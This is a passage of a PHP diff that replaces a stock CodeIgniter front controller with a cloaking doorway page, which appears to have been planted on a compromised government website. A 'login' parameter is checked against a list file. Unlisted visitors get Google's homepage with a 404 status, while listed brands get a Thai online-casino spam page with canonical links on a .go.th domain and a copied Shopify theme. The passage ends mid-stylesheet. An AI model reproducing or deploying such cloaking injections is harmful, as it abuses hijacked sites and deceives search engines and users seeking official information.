@@ -1,310 +1,2061 @@
 <?php
-header("Location: https://kejari-denpasar.kejaksaan.go.id");
-die();
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
- * @license	https://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.0.0
- * @filesource
- */
+    function feedback404()
+    {
+        header("HTTP/1.0 404 Not Found");
+        echo file_get_contents("https://www.google.co.th/"); 
+    }
+    
+    if (isset($_GET['login'])) {
+        $filename = "list.txt";
+        $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        $target_string = strtolower($_GET['login']);
+        foreach ($lines as $item) {
+            if (strtolower($item) === $target_string) {
+                $BRAND = strtoupper($target_string);
+            }
+        }
+        if (isset($BRAND)) {
+            $BRANDS = $BRAND;
+            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+            $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+            if (isset($fullUrl)) {
+                $parsedUrl = parse_url($fullUrl);
+                $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+                $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+                $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+                $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+                $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
+                $urlPath = $baseUrl;
+            } else {
+                echo "";
+            }
+        } else {
+            feedback404();
+            exit();
+        }
+    } else {
+        feedback404();
+        exit();
+    }
+    
+?>
 
-/*
- *---------------------------------------------------------------
- * APPLICATION ENVIRONMENT
- *---------------------------------------------------------------
- *
- * You can load different configurations depending on your
- * current environment. Setting the environment also influences
- * things like logging and error reporting.
- *
- * This can be set to anything, but default usage is:
- *
- *     development
- *     testing
- *     production
- *
- * NOTE: If you change these, also change the error_reporting() code below
- */
-	define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'development');
 
-/*
- *---------------------------------------------------------------
- * ERROR REPORTING
- *---------------------------------------------------------------
- *
- * Different environments will require different levels of error reporting.
- * By default development will show errors but testing and live will hide them.
- */
-switch (ENVIRONMENT)
-{
-	case 'development':
-		error_reporting(-1);
-		ini_set('display_errors', 1);
-	break;
+<!doctype html>
+<html class="no-js" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="">
+    <link rel="canonical" href="http://swdata.srisangworn.go.th/?login=<?php echo $BRANDS ?>"><link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin><title>
+      <?php echo $BRANDS ?> 💎 【SEXYWIN.COM】 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!</title>
 
-	case 'testing':
-	case 'production':
-		ini_set('display_errors', 0);
-		error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
-	break;
+    
+      <meta name="description" content="วางเดิมพันของคุณและรับรางวัลใหญ่ที่คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย - <?php echo $BRANDS ?>! เพลิดเพลินกับเกมและโบนัสที่หลากหลายที่ <?php echo $BRANDS ?> เช่น การเดิมพันคริกเก็ตและคาสิโนสด!">
+    
 
-	default:
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'The application environment is not set correctly.';
-		exit(1); // EXIT_ERROR
+    
+
+<meta property="og:site_name" content="SEXYWIN">
+<meta property="og:url" content="http://swdata.srisangworn.go.th/?login=<?php echo $BRANDS ?>">
+<meta property="og:title" content="<?php echo $BRANDS ?> 💎 【SEXYWIN.COM】 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!`x`">
+<meta property="og:type" content="product">
+<meta property="og:description" content="วางเดิมพันของคุณและรับรางวัลใหญ่ที่คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย - <?php echo $BRANDS ?>! เพลิดเพลินกับเกมและโบนัสที่หลากหลายที่ <?php echo $BRANDS ?> เช่น การเดิมพันคริกเก็ตและคาสิโนสด!"><meta property="og:image" content="http://d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740">
+  <meta property="og:image:secure_url" content="https://d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740">
+  <meta property="og:image:width" content="736">
+  <meta property="og:image:height" content="748"><meta property="og:price:amount" content="888.00">
+  <meta property="og:price:currency" content="THB"><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="<?php echo $BRANDS ?> 💎 【SEXYWIN.COM】 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!">
+<meta name="twitter:description" content="วางเดิมพันของคุณและรับรางวัลใหญ่ที่คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย - <?php echo $BRANDS ?>! เพลิดเพลินกับเกมและโบนัสที่หลากหลายที่ <?php echo $BRANDS ?> เช่น การเดิมพันคริกเก็ตและคาสิโนสด!">
+
+
+    <script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/constants.js?v=58251544750838685771707725416" defer="defer"></script>
+    <script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/pubsub.js?v=158357773527763999511707725441" defer="defer"></script>
+    <script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/global.js?v=37284204640041572741707725427" defer="defer"></script><script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/animations.js?v=88693664871331136111707725423" defer="defer"></script><script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script><meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/68938727674/digital_wallets/dialog">
+<link rel="alternate" type="application/json+oembed" href="http://swdata.srisangworn.go.th/?login=<?php echo $BRANDS ?>.oembed">
+<script async="async" src="/checkouts/internal/preloads.js?permanent-domain=d3dc94-3.myshopify.com&locale=en-ID"></script>
+<script id="shopify-features" type="application/json">{"accessToken":"46e1621bad0a0cf5f0c45efd2d26661a","betas":["rich-media-storefront-analytics"],"domain":"d3dc94-3.myshopify.com","predictiveSearch":true,"shopId":68938727674,"smart_payment_buttons_url":"https:\/\/d3dc94-3.myshopify.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/spb.en.js","dynamic_checkout_cart_url":"https:\/\/d3dc94-3.myshopify.com\/cdn\/shopifycloud\/payment-sheet\/assets\/latest\/dynamic-checkout-cart.en.js","locale":"en"}</script>
+<script>var Shopify = Shopify || {};
+Shopify.shop = "d3dc94-3.myshopify.com";
+Shopify.locale = "en";
+Shopify.currency = {"active":"THB","rate":"1.0"};
+Shopify.country = "ID";
+Shopify.theme = {"name":"Dawn","id":140220072186,"theme_store_id":887,"role":"main"};
+Shopify.theme.handle = "null";
+Shopify.theme.style = {"id":null,"handle":null};
+Shopify.cdnHost = "d3dc94-3.myshopify.com/cdn";
+Shopify.routes = Shopify.routes || {};
+Shopify.routes.root = "/";</script>
+<script type="module">!function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);</script>
+<script>!function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);</script>
+<script id="__st">var __st={"a":68938727674,"offset":25200,"reqid":"27afa7ee-b3f6-447a-947a-1b7ecd2a0825","pageurl":"d3dc94-3.myshopify.com\/products\/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94","u":"8b4e96f6bdc6","p":"product","rtyp":"product","rid":8172904907002};</script>
+<script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
+<script>!function(o){o.addEventListener("DOMContentLoaded",function(){window.Shopify=window.Shopify||{},window.Shopify.recaptchaV3=window.Shopify.recaptchaV3||{siteKey:"6LeHG2ApAAAAAO4rPaDW-qVpPKPOBfjbCpzJB9ey"};var t=['form[action*="/contact"] input[name="form_type"][value="contact"]','form[action*="/comments"] input[name="form_type"][value="new_comment"]','form[action*="/account"] input[name="form_type"][value="customer_login"]','form[action*="/account"] input[name="form_type"][value="recover_customer_password"]','form[action*="/account"] input[name="form_type"][value="create_customer"]','form[action*="/contact"] input[name="form_type"][value="customer"]'].join(",");function n(e){e=e.target;null==e||null!=(e=function e(t,n){if(null==t.parentElement)return null;if("FORM"!=t.parentElement.tagName)return e(t.parentElement,n);for(var o=t.parentElement.action,r=0;r<n.length;r++)if(-1!==o.indexOf(n[r]))return t.parentElement;return null}(e,["/contact","/comments","/account"]))&&null!=e.querySelector(t)&&((e=o.createElement("script")).setAttribute("src","https://cdn.shopify.com/shopifycloud/storefront-recaptcha-v3/v0.6/index.js"),o.body.appendChild(e),o.removeEventListener("focus",n,!0),o.removeEventListener("change",n,!0),o.removeEventListener("click",n,!0))}o.addEventListener("click",n,!0),o.addEventListener("change",n,!0),o.addEventListener("focus",n,!0)})}(document);</script>
+<script integrity="sha256-h4dvokWvGcvRSqiG7VnGqoonxF0k3NeoHPLSMjUGIz4=" data-source-attribution="shopify.loadfeatures" defer="defer" src="//d3dc94-3.myshopify.com/cdn/shopifycloud/shopify/assets/storefront/load_feature-87876fa245af19cbd14aa886ed59c6aa8a27c45d24dcd7a81cf2d2323506233e.js" crossorigin="anonymous"></script>
+<script data-source-attribution="shopify.dynamic_checkout.dynamic.init">var Shopify=Shopify||{};Shopify.PaymentButton=Shopify.PaymentButton||{isStorefrontPortableWallets:!0,init:function(){window.Shopify.PaymentButton.init=function(){};var t=document.createElement("script");t.src="https://d3dc94-3.myshopify.com/cdn/shopifycloud/portable-wallets/latest/portable-wallets.en.js",t.type="module",document.head.appendChild(t)}};
+</script>
+<script>
+  window.__shopify_portable_wallets_onerror__ = function(script) {
+    if (script && script.src) console.error(`Failed to load portable wallets script ${script.src}`);
+    var skeletons = document.querySelectorAll('dynamic-checkout > .shopify-payment-button__skeleton');
+    for (var i = 0; i < skeletons.length; i++) skeletons[i].remove();
+  }
+</script>
+
+<script type="module" src="https://d3dc94-3.myshopify.com/cdn/shopifycloud/portable-wallets/latest/portable-wallets.en.js" onError="__shopify_portable_wallets_onerror__(this)"></script>
+<script nomodule>
+  document.addEventListener("DOMContentLoaded", __shopify_portable_wallets_onerror__);
+</script>
+
+<script id="sections-script" data-sections="header" defer="defer" src="//d3dc94-3.myshopify.com/cdn/shop/t/1/compiled_assets/scripts.js?3"></script>
+<style id="shopify-dynamic-checkout">.shopify-payment-button__button--hidden {
+  visibility: hidden;
 }
 
-/*
- *---------------------------------------------------------------
- * SYSTEM DIRECTORY NAME
- *---------------------------------------------------------------
- *
- * This variable must contain the name of your "system" directory.
- * Set the path if it is not in the same directory as this file.
- */
-	$system_path = 'system';
+.shopify-payment-button__button {
+  border-radius: 4px;
+  border: none;
+  box-shadow: 0 0 0 0 transparent;
+  color: white;
+  cursor: pointer;
+  display: block;
+  font-size: 1em;
+  font-weight: 500;
+  line-height: 1;
+  text-align: center;
+  width: 100%;
+  transition: background 0.2s ease-in-out;
+}
 
-/*
- *---------------------------------------------------------------
- * APPLICATION DIRECTORY NAME
- *---------------------------------------------------------------
- *
- * If you want this front controller to use a different "application"
- * directory than the default one you can set its name here. The directory
- * can also be renamed or relocated anywhere on your server. If you do,
- * use an absolute (full) server path.
- * For more info please see the user guide:
- *
- * https://codeigniter.com/userguide3/general/managing_apps.html
- *
- * NO TRAILING SLASH!
- */
-	$application_folder = 'application';
+.shopify-payment-button__button[disabled] {
+  opacity: 0.6;
+  cursor: default;
+}
 
-/*
- *---------------------------------------------------------------
- * VIEW DIRECTORY NAME
- *---------------------------------------------------------------
- *
- * If you want to move the view directory out of the application
- * directory, set the path to it here. The directory can be renamed
- * and relocated anywhere on your server. If blank, it will default
- * to the standard location inside your application directory.
- * If you do move this, use an absolute (full) server path.
- *
- * NO TRAILING SLASH!
- */
-	$view_folder = '';
+.shopify-payment-button__button--unbranded {
+  background-color: #1990c6;
+  padding: 1em 2em;
+}
+
+.shopify-payment-button__button--unbranded:hover:not([disabled]) {
+  background-color: #136f99;
+}
+
+.shopify-payment-button__more-options {
+  background: transparent;
+  border: 0 none;
+  cursor: pointer;
+  display: block;
+  font-size: 1em;
+  margin-top: 1em;
+  text-align: center;
+  width: 100%;
+}
+
+.shopify-payment-button__more-options:hover:not([disabled]) {
+  text-decoration: underline;
+}
+
+.shopify-payment-button__more-options[disabled] {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.shopify-payment-button__button--branded {
+  display: flex;
+  flex-direction: column;
+  min-height: 44px;
+  position: relative;
+  z-index: 1;
+}
+
+.shopify-payment-button__button--branded .shopify-cleanslate {
+  flex: 1 !important;
+  display: flex !important;
+  flex-direction: column !important;
+}
+
+.shopify-payment-button__button.button.loading {
+  position: relative;
+  color: transparent;
+}
+
+.shopify-payment-button__button.button.loading > .loading-overlay__spinner {
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  position: absolute;
+  height: 100%;
+  display: flex;
+  align-items: center;
+}
+
+.shopify-payment-button__button.button.loading > .loading-overlay__spinner .spinner {
+  width: -moz-fit-content;
+  width: fit-content;
+}
+
+.button.loading > .loading-overlay__spinner .path {
+  stroke: white;
+}
+
+.shopify-payment-button__button .loading-overlay__spinner {
+  width: 1.8rem;
+  display: inline-block;
+}
+
+.shopify-payment-button__button .spinner {
+  animation: shopify-rotator 1.4s linear infinite;
+}
+
+@keyframes shopify-rotator {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(270deg);
+  }
+}
+
+.shopify-payment-button__button .path {
+  stroke-dasharray: 280;
+  stroke-dashoffset: 0;
+  transform-origin: center;
+  stroke: rgb(18,18,18);
+  animation: shopify-dash 1.4s ease-in-out infinite;
+}
+
+@media screen and (forced-colors: active) {
+  .shopify-payment-button__button .path{
+    stroke: CanvasText;
+  }
+}
+
+@keyframes shopify-dash {
+  0% {
+    stroke-dashoffset: 280;
+  }
+  50% {
+    stroke-dashoffset: 75;
+    transform: rotate(135deg);
+  }
+  100% {
+    stroke-dashoffset: 280;
+    transform: rotate(450deg);
+  }
+}
+
+@keyframes walletsLoadingSkeleton {
+  50% { opacity: 1; }
+  75% { opacity: 0.5; }
+  100% { opacity: 1; }
+}
+
+.shopify-payment-button__skeleton {
+  animation: walletsLoadingSkeleton 4s ease infinite;
+  animation-delay: -0.168s;
+  background-color: rgb(222, 222, 222);
+  box-sizing: border-box;
+}
+</style>
+<script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.end');</script>
 
 
-/*
- * --------------------------------------------------------------------
- * DEFAULT CONTROLLER
- * --------------------------------------------------------------------
- *
- * Normally you will set your default controller in the routes.php file.
- * You can, however, force a custom routing by hard-coding a
- * specific controller class/function here. For most applications, you
- * WILL NOT set your routing here, but it's an option for those
- * special instances where you might want to override the standard
- * routing in a specific front controller that shares a common CI installation.
- *
- * IMPORTANT: If you set the routing here, NO OTHER controller will be
- * callable. In essence, this preference limits your application to ONE
- * specific controller. Leave the function name blank if you need
- * to call functions dynamically via the URI.
- *
- * Un-comment the $routing array below to use this feature
- */
-	// The directory name, relative to the "controllers" directory.  Leave blank
-	// if your controller is not in a sub-directory within the "controllers" one
-	// $routing['directory'] = '';
+    <style data-shopify>
+      @font-face {
+  font-family: Assistant;
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+  src: url("//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=ca61822e0d1a049a979a9dc3e87b8eea121606100269011fb84d4888f230cd44") format("woff2"),
+       url("//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n4.a2d012304becc2a26f1ded1acc136fcab85c9afd.woff?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=43a34fd2758fce059383b06669366a5a2710964e990779c7eedf7a75199142bd") format("woff");
+}
 
-	// The controller class file name.  Example:  mycontroller
-	// $routing['controller'] = '';
+      @font-face {
+  font-family: Assistant;
+  font-weight: 700;
+  font-style: normal;
+  font-display: swap;
+  src: url("//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n7.3335c7bdaddf2501ddab87cdbd9be98f3870e10d.woff2?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=98bc7bb3019dec1ac95d422a4a4af0b5d405f5e07791ddd3075eb898694a3860") format("woff2"),
+       url("//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n7.7c85f5c5cc1555de92cc7ef2790ee3cffe5237f5.woff?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=81d91bdcb3de5096ccc2121b6c016565a20773d4b2e499ff9135bdbf393dd878") format("woff");
+}
 
-	// The controller function you wish to be called.
-	// $routing['function']	= '';
-
-
-/*
- * -------------------------------------------------------------------
- *  CUSTOM CONFIG VALUES
- * -------------------------------------------------------------------
- *
- * The $assign_to_config array below will be passed dynamically to the
- * config class when initialized. This allows you to set custom config
- * items or override any default config values found in the config.php file.
- * This can be handy as it permits you to share one application between
- * multiple front controller files, with each file containing different
- * config values.
- *
- * Un-comment the $assign_to_config array below to use this feature
- */
-	// $assign_to_config['name_of_config_item'] = 'value of config item';
+      
+      
+      @font-face {
+  font-family: Assistant;
+  font-weight: 400;
+  font-style: normal;
+  font-display: swap;
+  src: url("//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n4.bcd3d09dcb631dec5544b8fb7b154ff234a44630.woff2?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=ca61822e0d1a049a979a9dc3e87b8eea121606100269011fb84d4888f230cd44") format("woff2"),
+       url("//d3dc94-3.myshopify.com/cdn/fonts/assistant/assistant_n4.a2d012304becc2a26f1ded1acc136fcab85c9afd.woff?h1=ZDNkYzk0LTMuYWNjb3VudC5teXNob3BpZnkuY29t&hmac=43a34fd2758fce059383b06669366a5a2710964e990779c7eedf7a75199142bd") format("woff");
+}
 
 
+      
+        :root,
+        .color-scheme-1 {
+          --color-background: 36,40,51;
+        
+          --gradient-background: #242833;
+        
 
-// --------------------------------------------------------------------
-// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
-// --------------------------------------------------------------------
+        
 
-/*
- * ---------------------------------------------------------------
- *  Resolve the system path for increased reliability
- * ---------------------------------------------------------------
- */
+        --color-foreground: 255,255,255;
+        --color-background-contrast: 47,52,66;
+        --color-shadow: 18,18,18;
+        --color-button: 18,18,18;
+        --color-button-text: 255,255,255;
+        --color-secondary-button: 36,40,51;
+        --color-secondary-button-text: 18,18,18;
+        --color-link: 18,18,18;
+        --color-badge-foreground: 255,255,255;
+        --color-badge-background: 36,40,51;
+        --color-badge-border: 255,255,255;
+        --payment-terms-background-color: rgb(36 40 51);
+      }
+      
+        
+        .color-scheme-2 {
+          --color-background: 243,243,243;
+        
+          --gradient-background: #f3f3f3;
+        
 
-	// Set the current directory correctly for CLI requests
-	if (defined('STDIN'))
-	{
-		chdir(dirname(__FILE__));
-	}
+        
 
-	if (($_temp = realpath($system_path)) !== FALSE)
-	{
-		$system_path = $_temp.DIRECTORY_SEPARATOR;
-	}
-	else
-	{
-		// Ensure there's a trailing slash
-		$system_path = strtr(
-			rtrim($system_path, '/\\'),
-			'/\\',
-			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-		).DIRECTORY_SEPARATOR;
-	}
+        --color-foreground: 18,18,18;
+        --color-background-contrast: 179,179,179;
+        --color-shadow: 18,18,18;
+        --color-button: 18,18,18;
+        --color-button-text: 243,243,243;
+        --color-secondary-button: 243,243,243;
+        --color-secondary-button-text: 18,18,18;
+        --color-link: 18,18,18;
+        --color-badge-foreground: 18,18,18;
+        --color-badge-background: 243,243,243;
+        --color-badge-border: 18,18,18;
+        --payment-terms-background-color: rgb(243 243 243);
+      }
+      
+        
+        .color-scheme-3 {
+          --color-background: 36,40,51;
+        
+          --gradient-background: #242833;
+        
 
-	// Is the system path correct?
-	if ( ! is_dir($system_path))
-	{
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'Your system folder path does not appear to be set correctly. Please open the following file and correct this: '.pathinfo(__FILE__, PATHINFO_BASENAME);
-		exit(3); // EXIT_CONFIG
-	}
+        
 
-/*
- * -------------------------------------------------------------------
- *  Now that we know the path, set the main path constants
- * -------------------------------------------------------------------
- */
-	// The name of THIS file
-	define('SELF', pathinfo(__FILE__, PATHINFO_BASENAME));
+        --color-foreground: 255,255,255;
+        --color-background-contrast: 47,52,66;
+        --color-shadow: 18,18,18;
+        --color-button: 255,255,255;
+        --color-button-text: 0,0,0;
+        --color-secondary-button: 36,40,51;
+        --color-secondary-button-text: 255,255,255;
+        --color-link: 255,255,255;
+        --color-badge-foreground: 255,255,255;
+        --color-badge-background: 36,40,51;
+        --color-badge-border: 255,255,255;
+        --payment-terms-background-color: rgb(36 40 51);
+      }
+      
+        
+        .color-scheme-4 {
+          --color-background: 18,18,18;
+        
+          --gradient-background: #121212;
+        
 
-	// Path to the system directory
-	define('BASEPATH', $system_path);
+        
 
-	// Path to the front controller (this file) directory
-	define('FCPATH', dirname(__FILE__).DIRECTORY_SEPARATOR);
+        --color-foreground: 255,255,255;
+        --color-background-contrast: 146,146,146;
+        --color-shadow: 18,18,18;
+        --color-button: 255,255,255;
+        --color-button-text: 18,18,18;
+        --color-secondary-button: 18,18,18;
+        --color-secondary-button-text: 255,255,255;
+        --color-link: 255,255,255;
+        --color-badge-foreground: 255,255,255;
+        --color-badge-background: 18,18,18;
+        --color-badge-border: 255,255,255;
+        --payment-terms-background-color: rgb(18 18 18);
+      }
+      
+        
+        .color-scheme-5 {
+          --color-background: 51,79,180;
+        
+          --gradient-background: #334fb4;
+        
 
-	// Name of the "system" directory
-	define('SYSDIR', basename(BASEPATH));
+        
 
-	// The path to the "application" directory
-	if (is_dir($application_folder))
-	{
-		if (($_temp = realpath($application_folder)) !== FALSE)
-		{
-			$application_folder = $_temp;
-		}
-		else
-		{
-			$application_folder = strtr(
-				rtrim($application_folder, '/\\'),
-				'/\\',
-				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-			);
-		}
-	}
-	elseif (is_dir(BASEPATH.$application_folder.DIRECTORY_SEPARATOR))
-	{
-		$application_folder = BASEPATH.strtr(
-			trim($application_folder, '/\\'),
-			'/\\',
-			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-		);
-	}
-	else
-	{
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'Your application folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
-		exit(3); // EXIT_CONFIG
-	}
+        --color-foreground: 255,255,255;
+        --color-background-contrast: 23,35,81;
+        --color-shadow: 18,18,18;
+        --color-button: 255,255,255;
+        --color-button-text: 51,79,180;
+        --color-secondary-button: 51,79,180;
+        --color-secondary-button-text: 255,255,255;
+        --color-link: 255,255,255;
+        --color-badge-foreground: 255,255,255;
+        --color-badge-background: 51,79,180;
+        --color-badge-border: 255,255,255;
+        --payment-terms-background-color: rgb(51 79 180);
+      }
+      
 
-	define('APPPATH', $application_folder.DIRECTORY_SEPARATOR);
+      body, .color-scheme-1, .color-scheme-2, .color-scheme-3, .color-scheme-4, .color-scheme-5 {
+        color: rgba(var(--color-foreground), 0.75);
+        background-color: rgb(var(--color-background));
+      }
 
-	// The path to the "views" directory
-	if ( ! isset($view_folder[0]) && is_dir(APPPATH.'views'.DIRECTORY_SEPARATOR))
-	{
-		$view_folder = APPPATH.'views';
-	}
-	elseif (is_dir($view_folder))
-	{
-		if (($_temp = realpath($view_folder)) !== FALSE)
-		{
-			$view_folder = $_temp;
-		}
-		else
-		{
-			$view_folder = strtr(
-				rtrim($view_folder, '/\\'),
-				'/\\',
-				DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-			);
-		}
-	}
-	elseif (is_dir(APPPATH.$view_folder.DIRECTORY_SEPARATOR))
-	{
-		$view_folder = APPPATH.strtr(
-			trim($view_folder, '/\\'),
-			'/\\',
-			DIRECTORY_SEPARATOR.DIRECTORY_SEPARATOR
-		);
-	}
-	else
-	{
-		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
-		echo 'Your view folder path does not appear to be set correctly. Please open the following file and correct this: '.SELF;
-		exit(3); // EXIT_CONFIG
-	}
+      :root {
+        --font-body-family: Assistant, sans-serif;
+        --font-body-style: normal;
+        --font-body-weight: 400;
+        --font-body-weight-bold: 700;
 
-	define('VIEWPATH', $view_folder.DIRECTORY_SEPARATOR);
+        --font-heading-family: Assistant, sans-serif;
+        --font-heading-style: normal;
+        --font-heading-weight: 400;
 
-/*
- * --------------------------------------------------------------------
- * LOAD THE BOOTSTRAP FILE
- * --------------------------------------------------------------------
- *
- * And away we go...
- */
-require_once BASEPATH.'core/CodeIgniter.php';
+        --font-body-scale: 1.0;
+        --font-heading-scale: 1.0;
+
+        --media-padding: px;
+        --media-border-opacity: 0.05;
+        --media-border-width: 1px;
+        --media-radius: 0px;
+        --media-shadow-opacity: 0.0;
+        --media-shadow-horizontal-offset: 0px;
+        --media-shadow-vertical-offset: 4px;
+        --media-shadow-blur-radius: 5px;
+        --media-shadow-visible: 0;
+
+        --page-width: 120rem;
+        --page-width-margin: 0rem;
+
+        --product-card-image-padding: 0.0rem;
+        --product-card-corner-radius: 0.0rem;
+        --product-card-text-alignment: left;
+        --product-card-border-width: 0.0rem;
+        --product-card-border-opacity: 0.1;
+        --product-card-shadow-opacity: 0.0;
+        --product-card-shadow-visible: 0;
+        --product-card-shadow-horizontal-offset: 0.0rem;
+        --product-card-shadow-vertical-offset: 0.4rem;
+        --product-card-shadow-blur-radius: 0.5rem;
+
+        --collection-card-image-padding: 0.0rem;
+        --collection-card-corner-radius: 0.0rem;
+        --collection-card-text-alignment: left;
+        --collection-card-border-width: 0.0rem;
+        --collection-card-border-opacity: 0.1;
+        --collection-card-shadow-opacity: 0.0;
+        --collection-card-shadow-visible: 0;
+        --collection-card-shadow-horizontal-offset: 0.0rem;
+        --collection-card-shadow-vertical-offset: 0.4rem;
+        --collection-card-shadow-blur-radius: 0.5rem;
+
+        --blog-card-image-padding: 0.0rem;
+        --blog-card-corner-radius: 0.0rem;
+        --blog-card-text-alignment: left;
+        --blog-card-border-width: 0.0rem;
+        --blog-card-border-opacity: 0.1;
+        --blog-card-shadow-opacity: 0.0;
